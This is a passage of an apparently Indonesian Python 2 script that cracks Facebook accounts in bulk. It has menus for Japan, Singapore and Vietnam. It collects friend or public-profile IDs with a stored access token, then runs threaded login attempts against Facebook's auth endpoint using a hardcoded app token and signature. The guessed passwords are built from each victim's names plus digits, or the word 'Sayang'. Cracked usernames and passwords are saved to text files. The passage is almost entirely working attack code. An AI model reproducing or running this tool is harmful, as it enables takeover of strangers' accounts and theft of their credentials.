																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/japan.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'12345'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/japan.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/japan.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone japan.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
	##### CRACK singapura #####
def crack_singa():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;91m _________   ________.    "
	print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;97m  \______  /|__|   |___  /"
	print "\033[1;97m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m───────────────────\033[1;97m(\033[1;93mSingapura\033[1;97m)\033[1;94m────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_singa()

#### PILIH singpura ####
def pilih_singa():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_singa()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  /|__|   |___  /"
		print "\033[1;97m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK SINGAPURA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  /|__|   |___  /"
		print "\033[1;97m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK SINGAPURA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) ID Publik \033[1;91m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) Nama Akun \033[1;91m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik Tidak Ada!"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_indo()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  /|__|   |___  /"
		print "\033[1;97m         \/            \/ "
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;94m>>> \033[1;93mCRACK SINGAPURA \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali \033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_singa()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_singa()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN Singa #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/singa.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/singa.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/singa.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/singa.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/singa.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/singa.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('Sayang')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/singa.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/indo.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('Sayang')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/singa.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/singa.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['first_name'].lower()+'123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/singa.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/singa.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = j['first_name'].lower()+'12345'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/singa.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/singa.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'1234'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/singa.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/singa.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone singapura.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
	
	##### CRACK vietnam #####
def crack_viet():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;91m _________   ________.    "
	print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;93m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;93m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;91m  \______  /|__|   |___  /"
	print "\033[1;91m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m────────────────────\033[1;97m(\033[1;93mVietnam\033[1;97m)\033[1;94m─────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_viet()

#### PILIH vietnam ####
def pilih_viet():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_viet()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;93m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;93m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;91m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK VIETNAM \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;93m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;93m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;91m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK VIETNAM \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) ID Publik \033[1;91m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) Nama Akun \033[1;91m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik Tidak Ada!"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_viet()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;93m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
